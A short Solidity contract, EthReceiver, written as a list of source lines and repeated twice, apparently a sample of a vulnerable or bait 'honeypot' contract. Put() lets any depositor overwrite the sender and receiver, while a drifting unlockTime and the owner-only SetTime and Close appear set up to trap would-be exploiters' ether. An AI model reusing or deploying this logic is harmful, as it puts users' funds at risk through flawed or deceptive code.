['pragma solidity ^0.4.22;\n', '\n', 'contract EthReceiver\n', '{\n', '    bool closed = false;\n', '    uint unlockTime = 43200;\n', '    address sender;\n', '    address receiver;\n', ' \n', '    function Put(address _receiver) public payable {\n', '        if ((!closed && msg.value > 0.5 ether) || sender == 0x0 ) {\n', '            sender = msg.sender;\n', '            receiver = _receiver;\n', '            unlockTime += now;\n', '        }\n', '    }\n', '    \n', '    function SetTime(uint _unixTime) public {\n', '        if (msg.sender == sender) {\n', '            unlockTime = _unixTime;\n', '        }\n', '    }\n', '    \n', '    function Get() public payable {\n', '        if (receiver == msg.sender && now >= unlockTime) {\n', '            msg.sender.transfer(address(this).balance);\n', '        }\n', '    }\n', '    \n', '    function Close() public {\n', '        if (sender == msg.sender) {\n', '           closed=true;\n', '        }\n', '    }\n', '\n', '    function() public payable { }\n', '}']
['pragma solidity ^0.4.22;\n', '\n', 'contract EthReceiver\n', '{\n', '    bool closed = false;\n', '    uint unlockTime = 43200;\n', '    address sender;\n', '    address receiver;\n', ' \n', '    function Put(address _receiver) public payable {\n', '        if ((!closed && msg.value > 0.5 ether) || sender == 0x0 ) {\n', '            sender = msg.sender;\n', '            receiver = _receiver;\n', '            unlockTime += now;\n', '        }\n', '    }\n', '    \n', '    function SetTime(uint _unixTime) public {\n', '        if (msg.sender == sender) {\n', '            unlockTime = _unixTime;\n', '        }\n', '    }\n', '    \n', '    function Get() public payable {\n', '        if (receiver == msg.sender && now >= unlockTime) {\n', '            msg.sender.transfer(address(this).balance);\n', '        }\n', '    }\n', '    \n', '    function Close() public {\n', '        if (sender == msg.sender) {\n', '           closed=true;\n', '        }\n', '    }\n', '\n', '    function() public payable { }\n', '}']
